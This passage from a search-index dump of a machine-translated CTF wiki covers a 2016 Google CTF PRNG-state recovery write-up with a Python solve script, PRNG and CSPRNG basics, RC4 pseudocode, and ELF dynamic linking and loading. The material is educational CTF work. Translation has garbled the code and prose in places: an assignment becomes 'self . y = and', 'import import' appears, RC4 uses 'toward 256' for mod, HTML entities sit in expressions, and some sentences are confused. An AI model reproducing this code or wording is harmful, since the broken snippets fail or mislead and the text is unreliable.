* self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) def getbiti ( num , idx ): return bin ( num )[ - idx - 1 :] def main (): sp = SecurePrng () targetx = sp . x targety = sp . y print \"we would like to get x \" , targetx print \"we would like to get y \" , targety # suppose we have already guess two number guess1 = sp . next () guess2 = sp . next () p = 4646704883 # newx = tmpx*2+3-kx*p for kx , ky in product ( range ( 3 ), range ( 4 )): candidate = [[ 0 ]] # only 33 bit for i in range ( 33 ): #print 'idx ', i new_candidate = [] for old , bit in product ( candidate , range ( 2 )): #print old, bit oldx = old [ 0 ] #oldy = old[1] tmpx = oldx | (( bit & 1 ) << i ) #tmpy = oldy | ((bit / 2) << i) tmpy = tmpx ^ guess1 newx = tmpx * 2 + 3 - kx * p + ( 1 << 40 ) newy = tmpy * 3 + 9 - ky * p + ( 1 & lt ; & lt ; 40 ) tmp1 = newx ^ newy #print \"tmpx: \", bin(tmpx) #print \"targetx: \", bin(targetx) #print \"calculate: \", bin(tmp1 + (1 << 40)) #print \"target guess2: \", bin(guess1 + (1 << 40)) if getbiti ( guess2 + ( 1 << 40 ), i ) == getbiti ( tmp1 + ( 1 & lt ; & lt ; 40 ), i ): if [ tmpx ] not in new_candidate : #print \"got one\" #print bin(tmpx) #print bin(targetx) #print bin(tmpy) new_candidate . append ([ tmpx ]) candidate = new_candidate #print len (candidate) #print candidate print \"candidate x for kx: \" , kx , \" ky \" , ky for item in candidate : tmpx = candidate [ 0 ][ 0 ] tmpy = tmpx ^ guess1 if tmpx >= p or tmpx >= p : continue mysp = SecurePrng ( tmpx , tmpy ) tmp1 = mysp . next () if tmp1 != guess2 : continue print tmpx , tmpy print ( targetx * 2 + 3 ) % p , ( targety * 3 + 9 ) % p if __name__ == \"__main__\" : main ()","title":"Example"},{"location":"crypto/streamcipher/lcg/challenge/#_1","text":"","title":"\u9898"},{"location":"crypto/streamcipher/lcg/challenge/#2016-google-ctf-woodman","text":"The approximate meaning of the program is a guessing game. If you guess a number of times in a row, even if you get the flag, the core code behind the corresponding number is as follows: class SecurePrng ( object ): def __init__ ( self ): # generate seed with 64 bits of entropy self . p = 4646704883 L self . x = random . randint ( 0 , self . p ) self . y = random . randint ( 0 , self . p ) def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) Here we obviously, we guessed that the first two rounds are still relatively easy, after all, the probability is also 0.25. Here, after we guessed the first two rounds, we used Z3 to solve the initial x and y, then we can easily guess the remaining values. The specific script is as follows, but Z3 seems to be problematic when solving such problems. . . Here we consider another method, ** sequentially extracting the value of x from the low-bit enumeration to the high-bit bit. The reason for this is that it depends on such observation. a + b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. Because the i-th bit is operated, only the carry value of the low bit may be received. a - b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. Because the i-th bit is operated, there is only a possible borrow from the low bit. a * b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. Because this can be seen as multiple additions. a % b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. Because this can be seen as multiple subtractions. a ^ b = c, the value of the ith bit of c is only affected by the bits a and b. This is obvious. Note: Personally feel this technique is very useful. In addition, it is not difficult to know that the bit of p is 33 bits. The specific use ideas are as follows First get the value you guessed twice, this probability is 0.25. In turn, enumerate the corresponding bits of x after the first iteration from the low bit to the high bit. Calculate the second value according to the value of the enumeration. Only when the corresponding bit is correct, you can add it to the candidate correct value. It should be noted that due to the modulo, we need to reduce the number of enumerations in the end. In addition, in the final judgment, it is still necessary to ensure that the corresponding value meets certain requirements, because the number of reductions has been enumerated before. The specific use code is as follows import import random from itertools import product class SecurePrng ( object ): def __init__ ( self , x =- 1 , y =- 1 ): # generate seed with 64 bits of entropy self . p = 4646704883 L # 33bit if x == - 1 : self . x = random . randint ( 0 , self . p ) else : self . x = x if y == - 1 : self . y = random . randint ( 0 , self . p ) else : self . y = and def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) def getbiti ( num , idx ): return bin ( num )[ - idx - 1 :] def main (): sp = SecurePrng () targetx = sp . x targety = sp . y print \"we would like to get x \" , targetx print \"we would like to get y \" , targety # suppose we have already guess two number guess1 = sp . next () guess2 = sp . next () p = 4646704883 # newx = tmpx*2+3-kx*p for kx , ky in product ( range ( 3 ), range ( 4 )): candidate = [[ 0 ]] # only 33 bit for i in range ( 33 ): #print 'idx ', i new_candidate = [] for old , bit in product ( candidate , range ( 2 )): #print old, bit oldx = old [ 0 ] #oldy = old[1] tmpx = oldx | (( bit & 1 ) << i ) #tmpy = oldy | ((bit / 2) << i) tmpy = tmpx ^ guess1 newx = tmpx * 2 + 3 - kx * p + ( 1 << 40 ) newy = tmpy * 3 + 9 - ky * p + ( 1 & lt ; & lt ; 40 ) tmp1 = newx ^ newy #print \"tmpx: \", bin(tmpx) #print \"targetx: \", bin(targetx) #print \"calculate: \", bin(tmp1 + (1 << 40)) #print \"target guess2: \", bin(guess1 + (1 << 40)) if getbiti ( guess2 + ( 1 << 40 ), i ) == getbiti ( tmp1 + ( 1 & lt ; & lt ; 40 ), i ): if [ tmpx ] not in new_candidate : #print \"got one\" #print bin(tmpx) #print bin(targetx) #print bin(tmpy) new_candidate . append ([ tmpx ]) candidate = new_candidate #print len (candidate) #print candidate print \"candidate x for kx: \" , kx , \" ky \" , ky for item in candidate : tmpx = candidate [ 0 ][ 0 ] tmpy = tmpx ^ guess1 if tmpx >= p or tmpx >= p : continue mysp = SecurePrng ( tmpx , tmpy ) tmp1 = mysp . next () if tmp1 != guess2 : continue print tmpx , tmpy print ( targetx * 2 + 3 ) % p , ( targety * 3 + 9 ) % p if __name__ == \"__main__\" : main ()","title":"2016 Google CTF woodman"},{"location":"crypto/streamcipher/lcg/intro/","text":"Linear Congruence Generator \u00b6 To be added.","title":"Introduction"},{"location":"crypto/streamcipher/lcg/intro/#linear-congruence-generator","text":"To be added.","title":"Linear Congruence Generator"},{"location":"crypto/streamcipher/prng/csprng/","text":"\u5bc6\u7801\u5b89\u5168 pseudo-random number generator \u00b6 Introduction \u00b6 The cryptographically secure pseudo-random number generator (CSPRNG), also known as the cryptographic pseudo-random number generator (CPRNG), is a special pseudo-random number generation. Device. It needs to meet some of the necessary features to be suitable for cryptographic applications. Many aspects of cryptography require random numbers Key generation Generate initialization vector, IV, CBC, CFB, OFB mode for grouping passwords nounce, used to prevent replay attacks and CTR mode of block ciphers, etc. one-time pads Salt in some signature schemes, such as [ECDSA] ( https://en.wikipedia.org/wiki/ECDSA ), [RSASSA-PSS] ( https://en.wikipedia.org/w/index.php ?title=RSASSA-PSS&action=edit&redlink=1) demand \u00b6 There is no doubt that the requirements for cryptographically secure pseudo-random number generators are certainly higher than for general pseudo-random number generators. In general, CSPRNG requirements can be divided into two categories. Pass the statistical randomness test. CSPRNG must pass [next-bit test] ( https://en.wikipedia.org/wiki/Next-bit_test ), that is, knowing the first k bits of a sequence, it is impossible for an attacker to A probability greater than 50% predicts the next bit. One point mentioned here is that Yao Zhizhi proved in 1982 that if a generator can pass [next-bit test] ( https://en.wikipedia.org/wiki/Next-bit_test ), then it can also pass all other Polynomial time statistics test. Must be able to resist strong enough attacks, such as when the initial state of the generator or the state of the runtime is known to the attacker, the attacker is still unable to obtain the generated random number before the leak state. Categories \u00b6 As far as the current situation is concerned, the design of CSPRNG can be divided into the following three categories. Based on cryptographic algorithms such as ciphertext or hash values. Based on math problems Some special purpose designs references \u00b6 https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator","title":"Cryptographic Security Pseudo-random Number Generator"},{"location":"crypto/streamcipher/prng/csprng/#pseudo-random-number-generator","text":"","title":"\u5bc6\u7801\u5b89\u5168 pseudo-random number generator"},{"location":"crypto/streamcipher/prng/csprng/#introduction","text":"The cryptographically secure pseudo-random number generator (CSPRNG), also known as the cryptographic pseudo-random number generator (CPRNG), is a special pseudo-random number generation. Device. It needs to meet some of the necessary features to be suitable for cryptographic applications. Many aspects of cryptography require random numbers Key generation Generate initialization vector, IV, CBC, CFB, OFB mode for grouping passwords nounce, used to prevent replay attacks and CTR mode of block ciphers, etc. one-time pads Salt in some signature schemes, such as [ECDSA] ( https://en.wikipedia.org/wiki/ECDSA ), [RSASSA-PSS] ( https://en.wikipedia.org/w/index.php ?title=RSASSA-PSS&action=edit&redlink=1)","title":"Introduction"},{"location":"crypto/streamcipher/prng/csprng/#demand","text":"There is no doubt that the requirements for cryptographically secure pseudo-random number generators are certainly higher than for general pseudo-random number generators. In general, CSPRNG requirements can be divided into two categories. Pass the statistical randomness test. CSPRNG must pass [next-bit test] ( https://en.wikipedia.org/wiki/Next-bit_test ), that is, knowing the first k bits of a sequence, it is impossible for an attacker to A probability greater than 50% predicts the next bit. One point mentioned here is that Yao Zhizhi proved in 1982 that if a generator can pass [next-bit test] ( https://en.wikipedia.org/wiki/Next-bit_test ), then it can also pass all other Polynomial time statistics test. Must be able to resist strong enough attacks, such as when the initial state of the generator or the state of the runtime is known to the attacker, the attacker is still unable to obtain the generated random number before the leak state.","title":"demand"},{"location":"crypto/streamcipher/prng/csprng/#categories","text":"As far as the current situation is concerned, the design of CSPRNG can be divided into the following three categories. Based on cryptographic algorithms such as ciphertext or hash values. Based on math problems Some special purpose designs","title":"Categories"},{"location":"crypto/streamcipher/prng/csprng/#references","text":"https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator","title":"references"},{"location":"crypto/streamcipher/prng/intro/","text":"pseudo random number generator introduction \u00b6 Overview \u00b6 A pseudorandom number generator (PRNG), also known as a deterministic random bit generator (DRBG), is an algorithm used to generate a digital sequence** close to an absolute random number sequence. . In general, a PRNG relies on an initial value, also called a seed, to generate a corresponding pseudo-random number sequence. As long as the seed is determined, the random number generated by the PRNG is completely determined, so the sequence of random numbers it generates is not truly random. For now, PRNG plays an important role in many applications, such as simulation (Monte Carlo method), e-sports, and password applications. Randomness of rigor \u00b6 Randomness: Random numbers should be free of statistical bias and are completely messy series. Unpredictability: The next occurrence cannot be inferred from the past sequence. Non-reproducibility: The same sequence cannot be reproduced unless the sequence is saved. The stringency of these three properties increases in turn. In general, random numbers can be divided into three categories. Category Randomness Unpredictability Non-reproducibility | Weak pseudo-random number | \u2705 | \u274c | \u274c | | Strong pseudo-random number | \u2705 | \u2705 | \u274c | | Real random number | \u2705 | \u2705 | \u2705 | In general, the random number used in cryptography is the second. Cycle \u00b6 As we said before, once the seed that the PRNG depends on is determined, the sequence of random numbers generated by the PRNG is basically determined. The period in which the PRNG is defined here is as follows: For all possible starting states of a PRNG**, the longest length of the sequence is not repeated. Obviously, for a PRNG, its period will not be greater than all its possible states. However, it should be noted that not when we encounter repeated output, we can consider it to be the period of the PRNG, because the state of the PRNG is generally greater than the number of bits of the output. evaluation standard \u00b6 See Wikipedia, https://en.wikipedia.org/wiki/Pseudorandom_number_generator . Categories \u00b6 Currently, the common pseudo-random number generator mainly has Linear Congruence Generator, LCG Linear regression generator [Mersenne Twister] ( https://en.wikipedia.org/wiki/Mersenne_Twister ) xorshift generators WELL family of generators Linear feedback shift register, LFSR, linear feedback shift register problem \u00b6 In general, pseudo-random number generators may have the following problems In the case of some seeds, the period of the generated random number sequence will be smaller. Uneven distribution when generating large numbers. The continuous values are closely related, and the subsequent values are known, and the previous values can be known. The value of the output sequence is very uneven. Reference \u00b6 https://en.wikipedia.org/wiki/Pseudorandom_number_generator","title":"Introduction"},{"location":"crypto/streamcipher/prng/intro/#pseudo-random-number-generator-introduction","text":"","title":"pseudo random number generator introduction"},{"location":"crypto/streamcipher/prng/intro/#overview","text":"A pseudorandom number generator (PRNG), also known as a deterministic random bit generator (DRBG), is an algorithm used to generate a digital sequence** close to an absolute random number sequence. . In general, a PRNG relies on an initial value, also called a seed, to generate a corresponding pseudo-random number sequence. As long as the seed is determined, the random number generated by the PRNG is completely determined, so the sequence of random numbers it generates is not truly random. For now, PRNG plays an important role in many applications, such as simulation (Monte Carlo method), e-sports, and password applications.","title":"Overview"},{"location":"crypto/streamcipher/prng/intro/#randomness-of-rigor","text":"Randomness: Random numbers should be free of statistical bias and are completely messy series. Unpredictability: The next occurrence cannot be inferred from the past sequence. Non-reproducibility: The same sequence cannot be reproduced unless the sequence is saved. The stringency of these three properties increases in turn. In general, random numbers can be divided into three categories. Category Randomness Unpredictability Non-reproducibility | Weak pseudo-random number | \u2705 | \u274c | \u274c | | Strong pseudo-random number | \u2705 | \u2705 | \u274c | | Real random number | \u2705 | \u2705 | \u2705 | In general, the random number used in cryptography is the second.","title":"Randomness of rigor"},{"location":"crypto/streamcipher/prng/intro/#cycle","text":"As we said before, once the seed that the PRNG depends on is determined, the sequence of random numbers generated by the PRNG is basically determined. The period in which the PRNG is defined here is as follows: For all possible starting states of a PRNG**, the longest length of the sequence is not repeated. Obviously, for a PRNG, its period will not be greater than all its possible states. However, it should be noted that not when we encounter repeated output, we can consider it to be the period of the PRNG, because the state of the PRNG is generally greater than the number of bits of the output.","title":"Cycle"},{"location":"crypto/streamcipher/prng/intro/#evaluation-standard","text":"See Wikipedia, https://en.wikipedia.org/wiki/Pseudorandom_number_generator .","title":"evaluation standard"},{"location":"crypto/streamcipher/prng/intro/#categories","text":"Currently, the common pseudo-random number generator mainly has Linear Congruence Generator, LCG Linear regression generator [Mersenne Twister] ( https://en.wikipedia.org/wiki/Mersenne_Twister ) xorshift generators WELL family of generators Linear feedback shift register, LFSR, linear feedback shift register","title":"Categories"},{"location":"crypto/streamcipher/prng/intro/#problem","text":"In general, pseudo-random number generators may have the following problems In the case of some seeds, the period of the generated random number sequence will be smaller. Uneven distribution when generating large numbers. The continuous values are closely related, and the subsequent values are known, and the previous values can be known. The value of the output sequence is very uneven.","title":"problem"},{"location":"crypto/streamcipher/prng/intro/#reference","text":"https://en.wikipedia.org/wiki/Pseudorandom_number_generator","title":"Reference"},{"location":"crypto/streamcipher/prng/problem/","text":"\u9898 \u00b6 2017 Tokyo Westerns CTF 3 rd Backpacker's Problem \u00b6 A cpp file is given in the title, which probably means the following Given the integers a_1, a_2, ..., a_N, your task is to find a subsequence b of a where b_1 + b_2 + ... + b_K = 0. Input Format: N a_1 a_2 ... a_N Answer Format: K b_1 b_2 ... b_K Example Input: 4 -8 -2 3 5 Example Answer: 3 -8 3 5 It is a backpack problem. Among them, in this question, we need to solve 20 such backpack problems, the size of the backpack is 1 * 10 ~ 20 * 10 in order. The backpack problem of subset summation is an NPC problem, and the time complexity of the problem increases exponentially with the size of the backpack. The size of the backpack here is at most 200, and it is obviously impossible to use brute force. To be completed references \u00b6 https://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/woodman http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/","title":"Challenge Examples"},{"location":"crypto/streamcipher/prng/problem/#_1","text":"","title":"\u9898"},{"location":"crypto/streamcipher/prng/problem/#2017-tokyo-westerns-ctf-3rd-backpackers-problem","text":"A cpp file is given in the title, which probably means the following Given the integers a_1, a_2, ..., a_N, your task is to find a subsequence b of a where b_1 + b_2 + ... + b_K = 0. Input Format: N a_1 a_2 ... a_N Answer Format: K b_1 b_2 ... b_K Example Input: 4 -8 -2 3 5 Example Answer: 3 -8 3 5 It is a backpack problem. Among them, in this question, we need to solve 20 such backpack problems, the size of the backpack is 1 * 10 ~ 20 * 10 in order. The backpack problem of subset summation is an NPC problem, and the time complexity of the problem increases exponentially with the size of the backpack. The size of the backpack here is at most 200, and it is obviously impossible to use brute force. To be completed","title":"2017 Tokyo Westerns CTF 3rd Backpacker's Problem"},{"location":"crypto/streamcipher/prng/problem/#references","text":"https://github.com/r00ta/myWriteUps/tree/master/GoogleCTF/woodman http://mslc.ctf.su/wp/google-ctf-woodman-crypto-100/","title":"references"},{"location":"crypto/streamcipher/special/rc4/","text":"RC4 \u00b6 basic introduction \u00b6 Designed by Ron Rivest, RSA was originally part of RSA Security and is a patented cryptographic product. It is a byte-oriented stream cipher with a variable key length that is very simple, but it works. The RC4 algorithm is widely used in the SSL/TLS protocol and the WEP/WPA protocol. Basic Process \u00b6 RC4 mainly consists of three processes Initialize the S and T arrays. Initialize the replacement S. Generate a key stream. Initializing S and T arrays \u00b6 The code to initialize S and T is as follows for i = 0 to 255 do S [ i ] = i T [ i ] = K [ i mod keylen ]) Initialization replacement S \u00b6 j = 0 for i = 0 to 255 do j = ( j + S [ i ] + T [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ]) Generating a stream key \u00b6 i = j = 0 for each message byte b i = ( i + 1 ) ( toward 256 ) j = ( j + S [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ]) t = ( S [ i ] + S [ j ]) ( mod 256 ) print S [ t ] We generally refer to the first two parts as KSA and the last part to PRGA. Attack method \u00b6 To be added.","title":"RC4"},{"location":"crypto/streamcipher/special/rc4/#rc4","text":"","title":"RC4"},{"location":"crypto/streamcipher/special/rc4/#basic-introduction","text":"Designed by Ron Rivest, RSA was originally part of RSA Security and is a patented cryptographic product. It is a byte-oriented stream cipher with a variable key length that is very simple, but it works. The RC4 algorithm is widely used in the SSL/TLS protocol and the WEP/WPA protocol.","title":"basic introduction"},{"location":"crypto/streamcipher/special/rc4/#basic-process","text":"RC4 mainly consists of three processes Initialize the S and T arrays. Initialize the replacement S. Generate a key stream.","title":"Basic Process"},{"location":"crypto/streamcipher/special/rc4/#initializing-s-and-t-arrays","text":"The code to initialize S and T is as follows for i = 0 to 255 do S [ i ] = i T [ i ] = K [ i mod keylen ])","title":"Initializing S and T arrays"},{"location":"crypto/streamcipher/special/rc4/#initialization-replacement-s","text":"j = 0 for i = 0 to 255 do j = ( j + S [ i ] + T [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ])","title":"Initialization replacement S"},{"location":"crypto/streamcipher/special/rc4/#generating-a-stream-key","text":"i = j = 0 for each message byte b i = ( i + 1 ) ( toward 256 ) j = ( j + S [ i ]) ( mod 256 ) swap ( S [ i ], S [ j ]) t = ( S [ i ] + S [ j ]) ( mod 256 ) print S [ t ] We generally refer to the first two parts as KSA and the last part to PRGA.","title":"Generating a stream key"},{"location":"crypto/streamcipher/special/rc4/#attack-method","text":"To be added.","title":"Attack method"},{"location":"executable/elf/program-linking/","text":"\u7a0b\u5e8f\u94fe\u63a5 \u00b6 Static link \u00b6 Dynamic link \u00b6 Dynamic linking is mainly to resolve variables or references to functions during program initialization or during program execution. Some sections and head elements in an ELF file are related to dynamic links. Dynamically linked models are defined and implemented by the operating system. Dynamic Linker \u00b6 The dynamic linker can be used to help load the libraries needed by the application and parse the dynamic symbols (functions and global variables) exported by the library. When using dynamic linking to construct a program, the link-editor adds an element of type PT_INTERP to the program's program header to tell the system to call the dynamic linker as a program interpreter. > It should be noted that different systems will be different for the dynamic linker provided by the system. The executable and the dynamic linker work together to create a process image for the program, as detailed below: Add the memory segment of the executable to the process image. Add the memory segment of the shared object file to the process image. Relocate the executable and shared object files. If passed to the dynamic linker a file descriptor, close it. Pass control to the program. This makes us feel as if the program got the execute permission directly from the executable. The link editor also creates a variety of data to assist the dynamic linker in handling executables and shared object files, such as Sections of type SHT_DYNAMIC contain a variety of data, including information about other dynamic links at the beginning of this section. The section .hash of type SHT_HASH contains a symbol hash table. Sections .got and .plt of type SHT_PROGBITS contain two separate tables: global offset table, procedure linked table. The program uses the procedure link table to process the address independent code. Because all UNIX System V imports basic system services from a shared object file, the dynamic linker participates in the execution of each TIS ELF-conforming program. As stated in the program loading, the shared object file may occupy a different virtual address than that recorded in the program header. The dynamic linker relocates the memory image and updates the absolute address before the program takes control. If the shared object file is indeed loaded into the address specified in the program header, then the values of those absolute addresses will be correct. But usually, this will not happen. If the process's environment has a non-null value called LD_BIND_NOW, then the dynamic linker performs all relocations when passing permissions to the program. For example, all values of the following environment variables specify this behavior. LD_BIND_NOW = 1 LD_BIND_NOW = on LD_BIND_NOW = off Otherwise, LD_BIND_NOW either does not exist in the current process environment or has a non-null value. The dynamic linker can delay the entry of the link table of the parsing process. This is actually the delay binding of the plt table, that is, when the program needs to use a certain symbol, then address resolution, which can reduce the load of symbol resolution and relocation. Function Address \u00b6 The address reference of a function in the executable and the reference associated with it in the shared target may not be resolved to a value. The corresponding reference in the shared object file will be parsed by the dynamic linker to the virtual address corresponding to the function itself. The corresponding reference in the executable (from the shared object file) will be resolved by the link editor to the address in the entry for the corresponding function in the procedure link table. In order to allow different function addresses to work as expected, if an executable file references a function defined in the shared object file, the link editor will put the process link table entry of the corresponding function into the symbol associated with it. In the table entry. The dynamic linker handles this symbol table item in a special way. If the dynamic linker is looking for a symbol and encounters a symbol in the executable file for a symbol table entry, it will follow the following rules: If the st_shndx of the symbol table entry is not SHN_UNDEF , the dynamic linker will find the definition of this symbol and use its st_value as the address of the symbol. If st_shndx is SHN_UNDEF and the symbol type is STT_FUNC and the st_value member is not 0, the dynamic linker will treat this entry as special and use the value of st_value as the symbol the address of. Otherwise, the dynamic linker will assume that the symbols in the executable are undefined and continue processing. Some relocations are related to the entries of the process linkage table. These entries are used for direct function calls, not for reference function addresses. These relocations are not handled as above because the dynamic linker must not be able to redirect process link table entries and point them to themselves. Shared Object Dependencies \u00b6 When the link editor is processing an archive library, it extracts the library members and copies them into the output object file. This statically linked operation does not require dynamic connector participation during execution. The shared object file also provides the service, and the dynamic linker must attach the appropriate shared object file to the process image for easy execution. Therefore, executable files and shared object files specifically describe their dependencies. When a dynamic linker creates a memory segment for an object file, the dependencies described in the DT_NEEDED entry give the service that depends on the file to support the program. The dynamic linker creates a complete process image by continually connecting the referenced shared object files (even if a shared object file is referenced multiple times, it will only be connected once by the dynamic linker) and their dependencies. When parsing symbol references, the dynamic linker uses BFS (broadness first search) to check the symbol table. That is, first, it checks the symbol table of the executable itself, and then checks the symbol table in the DT_NEEDED entry in order before continuing to view the next dependency, and so on. The shared object file must be readable by the program, and other permissions are not required. The name in the dependency list is either a string in DT_SONAME or the pathname of the shared object file used to build the corresponding target file. For example, if a linker uses a shared object file with the DT_SONAME entry name lib1 and a shared object file with a path named /usr/lib/lib2, the executable will contain lib1 and /usr/ Lib/lib2 dependency list. If a shared object file has one or more /, such as /usr/lib/lib2 or directory/file, the dynamic linker will use that string directly as the path name. If there is no / in the name, such as lib1, then the following three mechanisms give the order in which the shared object files are searched. First, the dynamic array tag DT_RPATH may give a string containing a series of directories separated by :. For example /home/dir/lib:/home/dir2/lib: Tell us to search in the /home/dir/lib directory first, then search in /home/dir2/lib , and finally search in the current directory. Second, the variable named LD_LIBRARY_PATH in the process environment variable contains a list of directories of the above mentioned format, and there may be one at the end; followed by another directory listing followed by another directory listing. Here is an example with the same effect as the first one. LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib: LD_LIBRARY_PATH=/home/dir/lib;/home/dir2/lib: LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:; All directories in LD_LIBRARY_PATH will only be searched after searching for DT_RPATH. Although some programs (such as the link editor) are dealing; the list is different in the way it is, but the dynamic linker handles it in exactly the same way. In addition, the dynamic linker accepts the semicolon representation syntax, as described above. . Finally, if the above two directories cannot locate the desired library, the dynamic linker searches for libraries under the /usr/lib path. note > For security purposes, for programs identified by set-user and set-group , the dynamic linker ignores search environment variables (eg LD_LIBRARY_PATH ) and only searches for directories specified by DT_RPATH and /usr/ Lib .","title":"Program Link"},{"location":"executable/elf/program-linking/#_1","text":"","title":"\u7a0b\u5e8f\u94fe\u63a5"},{"location":"executable/elf/program-linking/#static-link","text":"","title":"Static link"},{"location":"executable/elf/program-linking/#dynamic-link","text":"Dynamic linking is mainly to resolve variables or references to functions during program initialization or during program execution. Some sections and head elements in an ELF file are related to dynamic links. Dynamically linked models are defined and implemented by the operating system.","title":"Dynamic link"},{"location":"executable/elf/program-linking/#dynamic-linker","text":"The dynamic linker can be used to help load the libraries needed by the application and parse the dynamic symbols (functions and global variables) exported by the library. When using dynamic linking to construct a program, the link-editor adds an element of type PT_INTERP to the program's program header to tell the system to call the dynamic linker as a program interpreter. > It should be noted that different systems will be different for the dynamic linker provided by the system. The executable and the dynamic linker work together to create a process image for the program, as detailed below: Add the memory segment of the executable to the process image. Add the memory segment of the shared object file to the process image. Relocate the executable and shared object files. If passed to the dynamic linker a file descriptor, close it. Pass control to the program. This makes us feel as if the program got the execute permission directly from the executable. The link editor also creates a variety of data to assist the dynamic linker in handling executables and shared object files, such as Sections of type SHT_DYNAMIC contain a variety of data, including information about other dynamic links at the beginning of this section. The section .hash of type SHT_HASH contains a symbol hash table. Sections .got and .plt of type SHT_PROGBITS contain two separate tables: global offset table, procedure linked table. The program uses the procedure link table to process the address independent code. Because all UNIX System V imports basic system services from a shared object file, the dynamic linker participates in the execution of each TIS ELF-conforming program. As stated in the program loading, the shared object file may occupy a different virtual address than that recorded in the program header. The dynamic linker relocates the memory image and updates the absolute address before the program takes control. If the shared object file is indeed loaded into the address specified in the program header, then the values of those absolute addresses will be correct. But usually, this will not happen. If the process's environment has a non-null value called LD_BIND_NOW, then the dynamic linker performs all relocations when passing permissions to the program. For example, all values of the following environment variables specify this behavior. LD_BIND_NOW = 1 LD_BIND_NOW = on LD_BIND_NOW = off Otherwise, LD_BIND_NOW either does not exist in the current process environment or has a non-null value. The dynamic linker can delay the entry of the link table of the parsing process. This is actually the delay binding of the plt table, that is, when the program needs to use a certain symbol, then address resolution, which can reduce the load of symbol resolution and relocation.","title":"Dynamic Linker"},{"location":"executable/elf/program-linking/#function-address","text":"The address reference of a function in the executable and the reference associated with it in the shared target may not be resolved to a value. The corresponding reference in the shared object file will be parsed by the dynamic linker to the virtual address corresponding to the function itself. The corresponding reference in the executable (from the shared object file) will be resolved by the link editor to the address in the entry for the corresponding function in the procedure link table. In order to allow different function addresses to work as expected, if an executable file references a function defined in the shared object file, the link editor will put the process link table entry of the corresponding function into the symbol associated with it. In the table entry. The dynamic linker handles this symbol table item in a special way. If the dynamic linker is looking for a symbol and encounters a symbol in the executable file for a symbol table entry, it will follow the following rules: If the st_shndx of the symbol table entry is not SHN_UNDEF , the dynamic linker will find the definition of this symbol and use its st_value as the address of the symbol. If st_shndx is SHN_UNDEF and the symbol type is STT_FUNC and the st_value member is not 0, the dynamic linker will treat this entry as special and use the value of st_value as the symbol the address of. Otherwise, the dynamic linker will assume that the symbols in the executable are undefined and continue processing. Some relocations are related to the entries of the process linkage table. These entries are used for direct function calls, not for reference function addresses. These relocations are not handled as above because the dynamic linker must not be able to redirect process link table entries and point them to themselves.","title":"Function Address"},{"location":"executable/elf/program-linking/#shared-object-dependencies","text":"When the link editor is processing an archive library, it extracts the library members and copies them into the output object file. This statically linked operation does not require dynamic connector participation during execution. The shared object file also provides the service, and the dynamic linker must attach the appropriate shared object file to the process image for easy execution. Therefore, executable files and shared object files specifically describe their dependencies. When a dynamic linker creates a memory segment for an object file, the dependencies described in the DT_NEEDED entry give the service that depends on the file to support the program. The dynamic linker creates a complete process image by continually connecting the referenced shared object files (even if a shared object file is referenced multiple times, it will only be connected once by the dynamic linker) and their dependencies. When parsing symbol references, the dynamic linker uses BFS (broadness first search) to check the symbol table. That is, first, it checks the symbol table of the executable itself, and then checks the symbol table in the DT_NEEDED entry in order before continuing to view the next dependency, and so on. The shared object file must be readable by the program, and other permissions are not required. The name in the dependency list is either a string in DT_SONAME or the pathname of the shared object file used to build the corresponding target file. For example, if a linker uses a shared object file with the DT_SONAME entry name lib1 and a shared object file with a path named /usr/lib/lib2, the executable will contain lib1 and /usr/ Lib/lib2 dependency list. If a shared object file has one or more /, such as /usr/lib/lib2 or directory/file, the dynamic linker will use that string directly as the path name. If there is no / in the name, such as lib1, then the following three mechanisms give the order in which the shared object files are searched. First, the dynamic array tag DT_RPATH may give a string containing a series of directories separated by :. For example /home/dir/lib:/home/dir2/lib: Tell us to search in the /home/dir/lib directory first, then search in /home/dir2/lib , and finally search in the current directory. Second, the variable named LD_LIBRARY_PATH in the process environment variable contains a list of directories of the above mentioned format, and there may be one at the end; followed by another directory listing followed by another directory listing. Here is an example with the same effect as the first one. LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib: LD_LIBRARY_PATH=/home/dir/lib;/home/dir2/lib: LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:; All directories in LD_LIBRARY_PATH will only be searched after searching for DT_RPATH. Although some programs (such as the link editor) are dealing; the list is different in the way it is, but the dynamic linker handles it in exactly the same way. In addition, the dynamic linker accepts the semicolon representation syntax, as described above. . Finally, if the above two directories cannot locate the desired library, the dynamic linker searches for libraries under the /usr/lib path. note > For security purposes, for programs identified by set-user and set-group , the dynamic linker ignores search environment variables (eg LD_LIBRARY_PATH ) and only searches for directories specified by DT_RPATH and /usr/ Lib .","title":"Shared Object Dependencies"},{"location":"executable/elf/program-loading/","text":"Loading \u00b6 The program loading process is actually the process of creating or expanding the process mirror. It simply copies the segments of the file into the virtual memory segment according to certain rules. The process will apply for the corresponding physical page only if the corresponding logical page is used in the process of execution. In general, many pages in a process are not referenced. Therefore, delaying physical reads and writes can improve system performance. In order to achieve such efficiency, the executable file and the file offset and virtual address of the segment owned by the shared object file must be appropriate, that is, they must be integer multiples of the page size. In the Intel architecture, the virtual address and file offset must be 4KB integers, or a larger integer multiple of 2. Below is an example of an executable file loaded into memory layout The corresponding code segment and the data segment are explained as follows In this example, although the code segment and the data segment are equal in the sense of modulo 4KB, there are still up to 4 pages containing impure code or data. Of course, in practice it will depend on the page size or the block size of the file system. The first page of the code snippet contains the ELF header, the program header table, and other information. The last page of the code segment contains a copy of the beginning of the data segment. The last page of the data segment contains a copy of the last part of the code segment. As for how much, it has not been explained yet. The last part of the data segment may contain information that is not relevant to the program's operation. Logically speaking, the system will 